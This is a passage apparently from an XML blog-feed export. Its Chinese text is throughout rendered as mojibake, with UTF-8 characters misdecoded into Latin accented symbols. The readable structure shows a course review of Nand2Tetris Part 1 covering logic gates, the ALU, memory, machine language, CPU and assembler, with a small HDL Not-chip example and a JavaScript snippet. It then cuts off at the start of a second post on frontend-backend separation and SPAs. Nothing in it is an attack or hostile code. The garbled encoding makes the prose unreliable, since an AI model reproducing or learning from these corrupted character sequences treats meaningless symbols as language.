å¤§æ¦‚å°±åƒæ˜¯ç–ŠåºŠæ¶å±‹ä¸€æ¨£ï¼Œä½ æŠŠç¬¬ä¸€å±¤è“‹å¥½ä¹‹å¾Œå°±è“‹ç¬¬äºŒå±¤ï¼Œè“‹åˆ°ç¬¬åå±¤çš„æ™‚å€™ï¼Œä½ ä¸ç”¨æ“”å¿ƒå‰ä¹å±¤æ˜¯æ€éº¼è“‹çš„ï¼Œä½ åªè¦çŸ¥é“å‰ä¹å±¤å·²ç¶“è“‹å¥½äº†å°±å¯ä»¥äº†ï¼Œå› ç‚ºä½ ç¾åœ¨çš„ä»»å‹™æ˜¯è“‹ç¬¬åå±¤ã€‚
é€™æ¨£çš„æ¦‚å¿µåœ¨é›»è…¦ç§‘å­¸è£¡é¢è¶…ç´šé‡è¦ï¼Œå› ç‚ºé›»è…¦å°±æ˜¯å€‹åˆ†å¾ˆå¤šå±¤çš„æ±è¥¿ï¼Œå¾æœ€åº•å±¤çš„é›»å­é›»è·¯ï¼Œå†åˆ°åŸºæœ¬é‚è¼¯é–˜ï¼ˆAndã€Or èˆ‡ Notï¼‰ï¼Œåˆ°æ¯”è¼ƒè¤‡é›œçš„ç¡¬é«”ï¼ˆRegisterã€ALUï¼‰ï¼Œå†åˆ°æ›´è¤‡é›œçš„ç¡¬é«”ï¼ˆCPUã€RAMï¼‰ç­‰ç­‰ï¼Œé€™äº›éƒ½æ˜¯ä¸€å±¤ä¸€å±¤å¾€ä¸Šå»ºæ§‹çš„ã€‚
è€Œé€™å ‚èª²å°±æ˜¯å¸¶ä½ å¾æœ€åº•å±¤é–‹å§‹ï¼Œä¸€è·¯å¾€ä¸Šå»ºï¼Œè®“ä½ çŸ¥é“ä¸€å°é›»è…¦æ˜¯ç”±å“ªäº›æ±è¥¿æ‰€çµ„æˆçš„ã€‚
é€™é‚Šçš„ã€Œæœ€åº•å±¤ã€æŒ‡çš„æ˜¯é‚è¼¯é–˜ï¼Œä½ ä¸ç”¨çŸ¥é“åœ¨å¯¦é«”ä¸–ç•Œçš„é›»è·¯åˆ°åº•æ€éº¼æ¥çš„ï¼ˆå› ç‚ºé‚£æ˜¯é›»å­æˆ–æ˜¯é›»æ©Ÿçš„é ˜åŸŸäº†ï¼‰ï¼Œä¹Ÿä¸ç”¨çŸ¥é“ã€Œè¼¸å…¥ã€åˆ°åº•æ€éº¼è¼¸å…¥ï¼Œã€Œè¼¸å‡ºã€åˆ°åº•æœƒè¼¸å‡ºåˆ°å“ªè£¡ã€‚
Unit1ï¼šBoolean functions ans logic gateé€™ä¸€é€±æœƒä»‹ç´¹åŸºæœ¬çš„é‚è¼¯é–˜ï¼Œä¾‹å¦‚èªª Or, And, Xor, Nand ä»¥åŠ Nor ç­‰ç­‰ï¼Œè®“ä½ çŸ¥é“ä»–å€‘çš„åŠŸç”¨ï¼Œé‚„æœƒæ•™ä½ ç•«çœŸå€¼è¡¨ï¼ˆTruth tableï¼‰ï¼Œè®“ä½ ç†Ÿæ‚‰é€™äº›åŸºæœ¬é‚è¼¯ã€‚
è€Œé€™é€±çš„ä½œæ¥­æ˜¯åªçµ¦ä½ ä¸€å€‹é‚è¼¯é–˜ Nandï¼Œè¦ä½ åšå‡ºä»¥ä¸‹ 15 ç¨®é›»è·¯ï¼š

Not
And
Or
Xor
Mux
DMux
Not16
And16
Or16
Mux16
Or8Way
Mux4Way16
Mux8Way16
DMux4Way
DMux8Way

é‚£è¦æ€éº¼åšå‘¢ï¼Ÿç”¨èª²ç¨‹åœ˜éšŠè‡ªå·±åšçš„ HDLï¼ˆhardware description languageï¼‰ é‚„æœ‰ç¡¬é«”æ¨¡æ“¬å™¨å°±å¯ä»¥äº†ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œè‹¥æ˜¯æƒ³è¦ç”¨ Nand åšå‡º Notï¼Œå¯ä»¥é€™æ¨£å¯«ï¼š
CHIP Not &#123; // æˆ‘è¦å¯«ä¸€å€‹å«åš Not çš„ chip    IN in; // è¼¸å…¥çš„è¨Šè™Ÿå«åš in    OUT out; // è¼¸å‡ºå«åš out    PARTS:    Nand (a=in, b=in, out=out); // æŠŠ in è·Ÿ in å‚³é€² Nand chipï¼Œè¼¸å‡ºåˆ° out&#125;

å¦‚æœæˆ‘çš„è¼¸å…¥æ˜¯ 0ï¼Œé‚£ in å°±æ˜¯ 0ï¼Œè€Œ 0 Nand 0 çš„çµæœæ˜¯ 1ï¼Œæ‰€ä»¥ out å°±æœƒæ˜¯ 1ï¼Œå°±æ˜¯ 0 ç¶“é not ä»¥å¾Œçš„çµæœã€‚è‹¥æ˜¯è¼¸å…¥æ˜¯ 1ï¼Œ1 Nand 1 æ˜¯ 0ï¼Œout å°±æœƒæ˜¯ 0ã€‚
å› æ­¤ï¼Œæˆ‘å€‘å¯ä»¥åªç”¨ Nand é€™å€‹é‚è¼¯é–˜å°±å®Œæˆ Not çš„åŠŸèƒ½ã€‚
é€™ä¸€å€‹å–®å…ƒå°±æ˜¯è®“ä½ å»ç†Ÿæ‚‰ HDL çš„å¯«æ³•ï¼Œä¸¦ä¸”è©¦è‘—æŠŠé›»è·¯çµ„åˆèµ·ä¾†ã€‚åœ¨æ¸¬è©¦çš„éƒ¨åˆ†ï¼Œèª²ç¨‹åœ˜éšŠä¹Ÿè²¼å¿ƒåœ°æä¾›äº†è‡ªè£½çš„ç¡¬é«”æ¨¡æ“¬å™¨ï¼Œè®“ä½ å¯ä»¥è¼‰å…¥é›»è·¯ï¼Œå¾ˆæ–¹ä¾¿åœ°å»æ¸¬è©¦åˆ°åº•æ˜¯ä¸æ˜¯å°çš„ï¼š
ï¼ˆåœ–ç‰‡å–è‡ªå®˜ç¶²ï¼‰
Unit2ï¼šBoolean arithmetic and the ALUé€™ä¸€é€±è¦ä¾†ä»‹ç´¹é›»è…¦ä¸­çš„æ•¸å­—é‹ç®—äº†ï¼Œæœƒè¬›åˆ°é›»è…¦æ€éº¼è¡¨ç¤ºæ•¸å­—ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶ç†ŸçŸ¥çš„äºŒé€²ä½ï¼Œä¹Ÿæœƒæåˆ°è² æ•¸çš„è¡¨ç¤ºæ–¹æ³•ï¼ˆäºŒçš„è£œæ•¸ï¼‰ï¼Œä½œæ¥­æ˜¯è¦åšå‡ºä»¥ä¸‹çš„é›»è·¯ï¼š

HalfAdder
FullAdder
Add16
Inc16
ALU

ALU çš„å…¨åæ˜¯ Arithmetic Logic Unitï¼Œæœ‰ä¿®éç›¸é—œèª²ç¨‹çš„äººæ‡‰è©²å°é€™å€‹ä¸é™Œç”Ÿï¼Œç¸½ä¹‹å°±æ˜¯æ‹¿ä¾†åšç®—è¡“é‹ç®—çš„ä¸€å€‹é›»è·¯ï¼Œè¼¸å…¥å…©å€‹æ•¸å­—ä»¥åŠä½ æƒ³é€²è¡Œçš„æ“ä½œï¼Œå°±æœƒè¼¸å‡ºçµæœã€‚
Unit3ï¼šMemoryå‰å…©é€±çš„é›£åº¦éƒ½é‚„å¥½ï¼Œé€™ä¸€é€±æˆ‘è¦ºå¾—é›£åº¦çªç„¶ä¸Šå‡ï¼Œä¸»å› æ˜¯å¼•å…¥äº†ä¸€å€‹æ–°çš„æ¦‚å¿µï¼šSequential logicï¼ˆåºå‘é‚è¼¯é›»è·¯ï¼‰ã€‚
åœ¨å‰å¹¾å€‹å–®å…ƒæ‰€è¨­è¨ˆçš„é›»è·¯ï¼Œéƒ½å«åš Combinational logicï¼ˆçµ„åˆé‚è¼¯é›»è·¯ï¼‰ï¼Œç°¡å–®ä¾†èªªå‘¢ï¼Œå¯ä»¥ç”¨é€™æ¨£çš„å¼å­ä¾†è¡¨ç¤ºï¼šout[t] = function(in[t])ï¼Œä½ åœ¨æŸå€‹æ™‚é–“é» t è¼¸å…¥å€¼ï¼Œå°±æœƒå›å‚³ç›¸å°æ‡‰çš„çµæœï¼Œä¸€åˆ‡ååˆ†ç°¡å–®æ˜ç­ã€‚
ä½†æ˜¯ Sequential logic ä¸ä¸€æ¨£ï¼Œå®ƒçš„è¼¸å‡ºä¸åªèˆ‡ç•¶å‰çš„è¼¸å…¥æœ‰é—œï¼Œèˆ‡ã€Œä»¥å‰çš„è¼¸å…¥ã€ä¹Ÿæœ‰é—œï¼Œæ›å¥è©±èªªï¼ŒSequential logic æœ‰è¨˜æ†¶æ±è¥¿çš„èƒ½åŠ›ã€‚
ä»¥ç¨‹å¼ä¾†åšæ¯”å–»ï¼ŒCombinational logic å¤§æ¦‚å°±åƒæ˜¯ pure functionï¼Œä½ çµ¦ä¸€æ¨£çš„ inputï¼Œä¸€å®šæœƒç”¢ç”Ÿä¸€æ¨£çš„ outputï¼›è€Œ Sequential logic å‰‡æ˜¯æœ‰ side-effect çš„ functionã€‚
é€™ä¸€é€±çš„ä½œæ¥­æ˜¯è¦åšå‡ºä»¥ä¸‹é›»è·¯ï¼š

1 bit register
16-bit register
RAM8ï¼ˆ16-bit &#x2F; 8-register memoryï¼‰
RAM64
RAM512
RAM4K
RAM16K
PCï¼ˆProgram Counterï¼‰

Unit4ï¼šMachine Languageå…¶å¯¦ä¸Šå€‹å–®å…ƒå°æ–¼é›»è…¦æ€éº¼åšçš„åªå·®æœ€å¾Œä¸€å€‹æ­¥é©Ÿäº†ï¼Œä½†é€™é€±å…ˆæš«æ™‚è„«é›¢ä¸€ä¸‹ç¡¬é«”èˆ‡é›»è·¯ï¼Œå…ˆå‡è¨­é›»è…¦å·²ç¶“åšå¥½äº†ï¼Œé‚£æ‡‰è©²è¦æ€éº¼è®“é›»è…¦å»åŸ·è¡Œç¨‹å¼ï¼Ÿ
è§£ç­”æ‡‰è©²å¤§å®¶éƒ½è½éï¼Œå°±æ˜¯ machine languageï¼Œæ©Ÿå™¨èªè¨€ï¼Œæ˜¯ CPU å”¯ä¸€çœ‹å¾—æ‡‚çš„èªè¨€ï¼Œç”± 0101010 çµ„æˆã€‚ä½†æ˜¯è¦ä½ ç›´æ¥å¯« machine language æœ‰é»å¤ªæ®˜é…·ï¼Œæ‰€ä»¥å®˜æ–¹æä¾›äº† Assemblerï¼Œè®“ä½ åªè¦å¯« assembly language å°±å¥½ã€‚
å› æ­¤é€™é€±å°±æ˜¯è¦ä¾†å¯« assembly languageï¼Œè®“ä½ ç†Ÿæ‚‰ HACK é€™å°é›»è…¦çš„æŒ‡ä»¤æ ¼å¼ã€‚ä½œæ¥­æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯è¼¸å…¥å…©å€‹æ•¸å­—ä»¥å¾Œå›å‚³ç›¸ä¹˜çš„çµæœï¼Œå¦ä¸€å€‹æ˜¯äº’å‹•å¼çš„ç¨‹å¼ï¼ŒæŒ‰ä¸‹éµç›¤æ™‚è¢å¹•æœƒè®Šé»‘ï¼Œæ”¾é–‹æ™‚æœƒè®Šç™½ã€‚
é€™é€±æˆ‘è¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„æ˜¯è¬›è§£äº† input èˆ‡ output çš„åŸç†ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œéµç›¤æ‰“å­—ä¹‹å¾Œé›»è…¦è¦æ€éº¼çŸ¥é“å‰›å‰›æŒ‰äº†ä»€éº¼æŒ‰éµï¼Ÿå¯ä»¥å¾ˆç°¡å–®åœ°ç°¡åŒ–æˆé€™æ¨£ï¼šæ¯ç•¶éµç›¤è¢«æŒ‰ä¸‹ï¼Œå°±æœƒå‚³é€ä¸€å€‹è¨Šè™Ÿåˆ°é›»è…¦ï¼Œä¸¦ä¸”åœ¨æŸä¸€å€‹ç‰¹å®šè¨˜æ†¶é«”ä½ç½®æ”¾å…¥å‰›å‰›æŒ‰çš„æŒ‰éµçš„ä»£ç¢¼ï¼Œé€™æ¨£å­æˆ‘åªè¦å»é‚£å€‹è¨˜æ†¶é«”ä½ç½®çœ‹æœ‰æ²’æœ‰å€¼ï¼Œå°±çŸ¥é“ä½¿ç”¨è€…æœ‰æ²’æœ‰æŒ‰æŒ‰éµäº†ã€‚
è¼¸å‡ºä¹Ÿæ˜¯ä¸€æ¨£ï¼Œæœ‰æŸå€‹è¨˜æ†¶é«”å€å¡Šï¼Œæ¯ä¸€å€‹ bit ä»£è¡¨ä¸€å€‹ pixelï¼Œ1 ä»£è¡¨é»‘è‰²ï¼Œ0 ä»£è¡¨ç™½è‰²ï¼Œè€Œè¢å¹•æœƒç”¨å¾ˆå¿«çš„é »ç‡ï¼ˆä¾‹å¦‚èªªä¸€ç§’ 50 æ¬¡ä¹‹é¡çš„ï¼‰å»è®€å–é€™å¡Šè¨˜æ†¶é«”ï¼Œä¸¦ä¸”æŠŠè©²é¡¯ç¤ºçš„åœ¨è¢å¹•ä¸Šé¡¯ç¤ºå‡ºä¾†ã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œè¼¸å…¥èˆ‡è¼¸å‡ºéƒ½å¯ä»¥é€éè¨˜æ†¶é«”çš„ç‰¹å®šä½ç½®ä¾†é”æˆã€‚
Unit5ï¼šComputer Architectureé€™é€±æŠŠä¹‹å‰ç¬¬ä¸‰é€±æ²’æœ‰åšå®Œçš„é›»è…¦ç¹¼çºŒåšï¼Œè¦ä¾†åš Memory ä»¥åŠ CPUï¼ŒåŒæ™‚ä¹Ÿå‘Šè¨´ä½ é›»è…¦æ˜¯æ€éº¼åŸ·è¡Œé€™äº›æŒ‡ä»¤çš„ã€‚é€™å€‹å–®å…ƒçš„å…§å®¹æ»¿é‡è¦çš„ï¼ŒæŠŠä¹‹å‰ç¬¬ä¸‰é€±æ‰€åšå‡ºä¾†çš„æ±è¥¿æ•´åˆèµ·ä¾†ï¼Œæœ€å¾Œåšæˆäº†ä¸€éƒ¨é›»è…¦ã€‚
Unit6ï¼šAssemblerç¬¬å››é€±çš„æ™‚å€™æˆ‘å€‘ç”¨äº†å®˜æ–¹æä¾›çš„ assembler è½‰æˆæ©Ÿå™¨ç¢¼ï¼Œè€Œ part1 çš„æœ€å¾Œä¸€é€±å°±æ˜¯è¦è®“ä½ è‡ªå·±å¯« assembelrï¼Œè‡ªå·±æŠŠçµ„åˆèªè¨€è½‰æˆæ©Ÿå™¨èªè¨€ã€‚
è‹¥æ˜¯ä¸æœƒå¯«ç¨‹å¼çš„è©±ï¼Œå®˜æ–¹ä¹Ÿæä¾›äº†å¦å¤–ä¸€ç¨®äº¤ä½œæ¥­çš„æ–¹å¼ï¼Œé‚£å°±æ˜¯æ‰‹å‹•ç¿»è­¯ã€‚è‡ªå·±æŠŠæ¯ä¸€è¡Œç¨‹å¼ç¢¼æŸ¥è¡¨ç„¶å¾Œç¿»æˆæ©Ÿå™¨èªè¨€ã€‚
åšåˆ°é€™é‚Šï¼Œä¸ƒå€‹å–®å…ƒå°±éƒ½çµæŸäº†ï¼Œåœ¨é€™ä¸ƒå€‹å–®å…ƒè£¡é¢åšå‡ºäº†å¾ˆå¤šçš„é›»è·¯ï¼Œæœ€å¾Œåšå‡ºäº† CPUã€Memory ä»¥åŠä¸€å°é›»è…¦ï¼Œä¹ŸçŸ¥é“è¦æ€éº¼åœ¨é€™å°é›»è…¦ä¸ŠåŸ·è¡ŒæŒ‡ä»¤ï¼ŒçŸ¥é“æ€éº¼å¯«ä¸€å€‹ assemblerã€‚
èª²ç¨‹å¿ƒå¾—é€™å ‚èª²èˆ‡ CS50 ä¸€æ¨£ï¼Œéƒ½æ¨™æ¦œè‘—æ¯«ç„¡åŸºç¤ä¹Ÿå¯ä»¥ä¸Šã€‚ä½†æˆ‘ä¹‹å‰å°±èªªéäº†ï¼Œæˆ‘ä¸èªç‚º CS50 çœŸçš„é©åˆæ‰€æœ‰æ²’æœ‰åŸºç¤çš„äººï¼Œå°æœ‰äº›äººä¾†èªªï¼Œæ¢¯åº¦ä¾èˆŠå¤ªé«˜ï¼Œé›£åº¦ä¸Šå‡å¤ªå¿«ï¼Œé‚„æœ‰æ”¹é€²çš„ç©ºé–“ã€‚
é‚£é€™å ‚èª²å‘¢ï¼Ÿæˆ‘è¦ºå¾—æ–°æ‰‹å¯ä»¥å˜—è©¦çœ‹çœ‹ï¼Œå› ç‚ºçœŸçš„ä¸éœ€è¦ä»»ä½•ç¨‹å¼åŸºç¤ï¼Œä½†æˆ‘çŒœä½œæ¥­çš„éƒ¨åˆ†ä¾èˆŠæœƒå¡é—œçš„æ»¿åš´é‡çš„ã€‚é›–ç„¶èªªä¸éœ€è¦ç¨‹å¼åŸºç¤ï¼Œä½†æœ‰äº›ä½œæ¥­é‚„æ˜¯å¾ˆåƒä½ çš„é‚è¼¯è·Ÿæ€è€ƒèƒ½åŠ›ï¼Œä¸€å€‹æç¥å°±å¿˜è¨˜è‡ªå·±ç¾åœ¨æƒ³åˆ°å“ªè£¡äº†ã€‚
åœ¨ä¿®é€™å ‚èª²çš„éç¨‹ä¸­ï¼Œæœ‰å¹¾å€‹è®“æˆ‘é©šè±”åˆ°çš„é»ï¼Œä»¥ä¸‹æœ‰é›·ï¼Œå¯èƒ½æœƒç ´å£ä¿®èª²çš„æ¨‚è¶£ï¼Œå¯è‡ªè¡Œæ–Ÿé…Œæ˜¯å¦è§€çœ‹ã€‚
ç¬¬ä¸€å€‹æ˜¯ HACK çš„æ©Ÿå™¨èªè¨€æœ‰åˆ†å…©ç¨®ï¼Œä¸€ç¨®æ˜¯ A-instructionï¼Œå¦ä¸€ç¨®æ˜¯ C-instructionï¼Œå€åˆ¥çš„æ–¹æ³•æ˜¯æœ€é«˜ä½ï¼Œä¸€å€‹æ˜¯ 0 ä¸€å€‹æ˜¯ 1ã€‚å‰è€…æ˜¯æ‹¿ä¾†è¼‰å…¥ä¸€å€‹ 15bit çš„å€¼ç”¨çš„ã€‚
ç¬¬å››é€±åœ¨å¯«çµ„åˆèªè¨€æ™‚æ²’æ³¨æ„åˆ°ç‚ºä»€éº¼ï¼Œä¸€ç›´åˆ°ç¬¬äº”é€±åš CPU çš„æ™‚å€™æ‰æç„¶å¤§æ‚Ÿã€‚å› ç‚º A-instruction è¦è¼‰å…¥ä¸€å€‹ 15bit çš„å€¼ï¼Œä½† register æ˜¯ 16bitï¼ŒåŸæœ¬æƒ³èªªè¦æ€éº¼æŠŠ 15bit å¤šåŠ ä¸€å€‹ bit è®Šæˆ 16bitã€‚å¾Œä¾†æ‰çªç„¶æƒ³åˆ° A-instruction å› ç‚ºæ˜¯ 0 é–‹é ­ï¼Œæ‰€ä»¥æ•´å€‹ instruction ç›´æ¥ä¸Ÿåˆ° register å»å°±å¥½ï¼Œå€¼æ˜¯ä¸€æ¨£çš„ã€‚
å†ä¾†æ˜¯ç¬¬äºŒé€±çš„ ALUï¼Œå®ƒå¯ä»¥åšçš„æ“ä½œå¾ˆå¤šï¼ŒåŸæœ¬ä¸€ç›´å¾ˆå¥½å¥‡è¦æ€æ¨£æ‰èƒ½æŒ‡å®šåšå“ªå€‹æ“ä½œï¼Œå¦‚æœæ˜¯ç¨‹å¼èªè¨€ï¼Œæˆ‘çš„æƒ³åƒæœƒæ˜¯é€™æ¨£ï¼š
if (op === 1) &#123;  return x;&#125; else if (op === 2) &#123;  return y;&#125; else if (op === 3) &#123;  return x + y;&#125; else if (op === 4) &#123;  return x &amp; y;&#125;

å¯æ˜¯é›»è·¯åŸºæœ¬ä¸Šæ²’æœ‰é€™ç¨® if å¯ä»¥ç”¨ï¼Œé‚£è©²æ€éº¼è¾¦å‘¢ï¼Ÿ
çµæœç­”æ¡ˆä»¤æˆ‘å¤§åƒä¸€é©šï¼Œæ˜¯é€é 6 å€‹ control bit å° input åšæ“ä½œï¼Œè€Œé€™ 6 å€‹ bit çš„çµ„åˆå°±å¯ä»¥ç”¢ç”Ÿå‡ºä¸åŒç¨®æƒ³è¦çš„çµæœï¼Œè©³æƒ…å¯è¦‹ä¸‹åœ–ï¼š

è€Œ ALU çš„å¦å¤–å…©å€‹ outputï¼šngï¼ˆè¼¸å‡ºæ˜¯å¦ç‚ºè² æ•¸ï¼‰èˆ‡ zrï¼ˆè¼¸å‡ºæ˜¯å¦ç‚ºé›¶ï¼‰åŸæœ¬çœ‹ä¼¼ç„¡ç”¨ï¼Œä½†å…¶å¯¦æ˜¯ç‚ºäº†ä¹‹å¾Œæœƒç¢°åˆ°çš„ jump åšæº–å‚™ï¼Œé€™ä¹Ÿæ˜¯èª²ç¨‹ä¸Šåˆ°å¾Œé¢æ‰æœƒçŸ¥é“çš„äº‹æƒ…ã€‚
ç¸½ä¹‹å‘¢ï¼Œé€™å ‚èª²æˆ‘è¦ºå¾—å®‰æ’å¾—å¾ˆå¥½ï¼Œå¾æœ€åŸºç¤çš„é›»è·¯é–‹å§‹ä¸€ç›´æ…¢æ…¢è®Šè¤‡é›œï¼ŒåŒæ™‚ä¹Ÿè®“ä½ å­¸æœƒæ©Ÿå™¨èªè¨€è·Ÿçµ„åˆèªè¨€ï¼Œå°é›»è…¦åº•å±¤çš„æ±è¥¿ç†Ÿæ‚‰äº†è¨±å¤šã€‚
æ¥è‘—ä¾†è¬›ä¸€ä¸‹èº«ç‚ºè€å¸«ï¼Œé€™å ‚èª²è£¡é¢æœ‰å“ªäº›æ±è¥¿æ˜¯å€¼å¾—åœ¨æ•™å­¸ä¸Šå€Ÿé¡çš„ã€‚
ç¬¬ä¸€æ˜¯å®¢è£½åŒ–çš„å·¥å…·ï¼Œä¾‹å¦‚èªªä»–å€‘ç‚ºäº†é€™å ‚èª²ç‰¹åˆ¥é–‹ç™¼å‡ºçš„ HDL è·Ÿç¡¬é«”æ¨¡æ“¬å™¨ï¼Œå°±æ˜¯ç‚ºäº†è®“æ¯«ç„¡åŸºç¤çš„åˆå­¸è€…ä¹Ÿèƒ½æ–¹ä¾¿å­¸ç¿’ï¼Œé€™å€‹å¾ˆå€¼å¾—åƒè€ƒã€‚
ç¬¬äºŒæ˜¯ä½œæ¥­çš„æ‰¹æ”¹æ–¹å¼ï¼Œåœ¨ä½œæ¥­çš„è³‡æ–™å¤¾è£¡é¢å…¶å¯¦éƒ½æœ‰é™„ä¸Šç›¸å°æ‡‰çš„æ¸¬è©¦æª”ï¼Œè—‰ç”±æ¸¬è©¦æª”ï¼Œå­¸ç”Ÿå°±å¯ä»¥è‡ªå·±ç¢ºèªæ˜¯å¦æ­£ç¢ºã€‚
ç¬¬ä¸‰æ˜¯ä½œæ¥­çš„æ›¿ä»£æ–¹æ¡ˆï¼Œåœ¨æœ€å¾Œä¸€é€±çš„ä½œæ¥­è£¡ï¼Œç‰¹åˆ¥ç‚ºä¸æœƒå¯«ç¨‹å¼çš„åŒå­¸æº–å‚™äº†å¦å¤–ä¸€å€‹æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯æ‰‹å‹•ç¿»è­¯ç¨‹å¼ç¢¼ï¼Œé€™å€‹ä¹Ÿå¯ä»¥å­¸èµ·ä¾†ã€‚
ç¬¬å››æ˜¯èª²ç¨‹çš„ç·¨æ’ï¼Œé›–ç„¶æœ‰è¬›åˆ°é›»è·¯ä½†ä¸æœƒè¬›åˆ°å¤ªæ·±ï¼Œå› ç‚ºå¤ªæ·±çš„è©±å°±æ˜¯é›»å­é›»æ©Ÿçš„é ˜åŸŸäº†ï¼Œè€Œä¸æ–·å¾€å‰æ¨é€²çš„èª²ç¨‹ç·¨æ’ä¹Ÿå¾ˆæ£’ï¼Œå¾ Nand é–‹å§‹ä¸€è·¯åšåˆ° CPUã€‚
ç¬¬äº”æ˜¯èª²ç¨‹é †åºçš„é¸æ“‡ï¼Œå‰å¹¾é€±éƒ½æ˜¯ bottom-upï¼Œç”±ä¸‹å¾€ä¸Šæ…¢æ…¢å»ºç«‹è§€å¿µï¼Œåˆ°ç¬¬å››é€±çªç„¶ç”±ä¸Šå¾€ä¸‹ï¼Œå…ˆå¯«çµ„åˆèªè¨€å†å»çµ„é›»è…¦ï¼Œé€™æ¨£çš„ç·¨æ’åè€Œæœƒè®“å­¸ç”Ÿæ›´æœ‰æ„Ÿï¼Œåœ¨åšé›»è…¦çš„æ™‚å€™å·²ç¶“å°é‚£äº› machine code æœ‰ä¸€å®šçš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚
ç¬¬å…­æ˜¯å¸¸è¦‹å•é¡Œçš„è™•ç†æ–¹å¼ï¼Œåœ¨æ¯ä¸€å€‹å–®å…ƒæœ€å¾Œéƒ½æœ‰ä¸€å€‹ Perspectives çš„å½±ç‰‡ï¼Œç”±å…©ä½æ•™æˆä¾†å›ç­”å¸¸è¦‹å•é¡Œï¼Œåˆ©ç”¨é€™æ¨£çš„æ–¹å¼çµ±ä¸€å›ç­”çœäº†æ»¿å¤šæ™‚é–“ã€‚
çµèªç„¡è«–ä½ æœ‰æ²’æœ‰ç¨‹å¼åŸºç¤ï¼Œæˆ‘è¦ºå¾—éƒ½å¯ä»¥è©¦è©¦çœ‹é€™å ‚èª²ï¼Œåœ¨æ­¤èª å¿ƒæ¨è–¦çµ¦å¤§å®¶ã€‚
æˆ‘è‡ªå·±æ˜¯ä¸Š Coursera çš„ç‰ˆæœ¬ï¼Œå®Œå…¨å…è²»ï¼Œä½†è‹¥æ˜¯è¦æ”¹ä½œæ¥­æ‹¿è­‰æ›¸çš„è©±è¦ä»˜ 50 å¡Šç¾é‡‘ï¼Œç‚ºäº†æ”¯æŒé€™å€‹èª²ç¨‹æˆ‘æ˜¯äºŒè©±ä¸èªªå°±ä»˜äº†ï¼Œä¸éè¦ä¸è¦è³¼è²·å¤§å®¶å¯ä»¥è‡ªå·±æ–Ÿé…Œã€‚
ç„¶å¾Œé€™åªæ˜¯ part1 è€Œå·²ï¼Œæ˜å¹´æˆ‘è¦ç¹¼çºŒä¾†ä¸Š part2ï¼Œç­‰ part2 ä¸Šå®Œå†ä¾†è·Ÿå¤§å®¶åˆ†äº«å¿ƒå¾—ã€‚ä¹‹å‰é‡‘é–€å¤§å­¸è³‡å·¥ç³»çš„æ•™æˆé™³é¾èª ä¹Ÿæœ‰å¯«éå¿ƒå¾—æ–‡ï¼šNand2Tetris æ…•èª²è¨˜ â€“ å¾é‚è¼¯é–˜åˆ°æ–¹å¡ŠéŠæˆ²ï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹ä¹Ÿå¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚
æœ€å¾Œï¼Œåˆ¥å†çŒ¶è±«äº†ï¼Œè¶•å¿«å»ä¿®å§ï¼
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
  </entry>
  <entry>
    <title>å‰å¾Œç«¯åˆ†é›¢èˆ‡ SPA</title>
    <url>/2017/09/16/frontend-backend-mvc/</url>
    <content><![CDATA[å‰è¨€é€™ç¯‡çš„åŸæ–‡ï¼ˆä½ èµ°ä½ çš„é™½é—œé“ï¼Œæˆ‘èµ°æˆ‘çš„ç¨æœ¨æ©‹ï¼šå‰å¾Œç«¯åˆ†é›¢ï¼‰æ˜¯æˆ‘ä¹‹å‰åœ¨ iT é‚¦å¹«å¿™éµäººè³½çš„å…¶ä¸­ä¸€ç¯‡æ–‡ç« ï¼Œå¯«å®Œä¹‹å¾Œæœ‰é™¸é™¸çºŒçºŒæ”¶åˆ°ä¸€äº›å›é¥‹ï¼Œå°±æƒ³èªªå¯ä»¥é‡æ–°æ•´ç†ä¸€ä¸‹é€™ç¯‡æ–‡ç« ï¼Œè®“å®ƒè®Šå¾—å†æ›´æ¸…æ¥šä¸€é»ã€‚
å¦‚æœä½ æœ‰ä»¥ä¸‹ç–‘æƒ‘çš„è©±ï¼Œé€™ç¯‡æ–‡ç« éå¸¸é©åˆä½ ï¼š

ç‚ºä»€éº¼å‰ç«¯æœƒæœ‰ MVCï¼Ÿ
å‰ç«¯ MVC è·Ÿå¾Œç«¯ MVC æœ‰ä»€éº¼ä¸ä¸€æ¨£ï¼Ÿ
ç‚ºä»€éº¼è¦æœ‰ SPAï¼ˆSingle Page Applicationï¼‰ï¼Ÿ

ï¼ˆå…¶å¯¦é—œæ–¼ MVC åˆ°åº•æ˜¯ä»€éº¼å°±æœ‰å¾ˆå¤šè¨è«–äº†ï¼Œä½†å› ç‚ºé€™ç¯‡æ–‡ç« çš„é‡é»ä¸åœ¨æ–¼æ­¤ï¼Œæ‰€ä»¥å°é€™æ–¹é¢å°±ä¸å¤šåŠ æè¿°ï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹å€‘å¯åƒè€ƒï¼šMVCæ˜¯ä¸€å€‹å·¨å¤§èª¤æœƒï¼‰
å…ˆå¾ä½ ç†Ÿæ‚‰çš„æµç¨‹é–‹å§‹å¦‚æœä½ è¦å¯«ä¸€å€‹ç°¡æ˜“çš„éƒ¨è½æ ¼ï¼Œä½ æœƒæ€éº¼åšï¼Ÿ
é€™ç­”æ¡ˆå¾ˆç°¡å–®å˜›ï¼Œå¯ä»¥å…ˆæŒ‘ä¸€å€‹å–œæ­¡çš„æ¡†æ¶ï¼Œä¾‹å¦‚èªª Railsã€Laravel ç­‰ç­‰ï¼Œç„¶å¾Œå…ˆå®šç¾©å¥½å¹¾å€‹ URLï¼Œå†æŠŠ DB çš„ Schema æƒ³å¥½ï¼Œæœ€å¾Œé–‹å§‹å‹•æ‰‹ codingã€‚
ä¾‹å¦‚èªªé¦–é çš„éƒ¨åˆ†å°±æ˜¯å» DB æŠŠæ‰€æœ‰æ–‡ç« éƒ½æ’ˆå›ä¾†ï¼Œç„¶å¾ŒæŠŠè³‡æ–™ä¸Ÿåˆ° view è£¡é¢å» renderï¼Œæå®šï¼
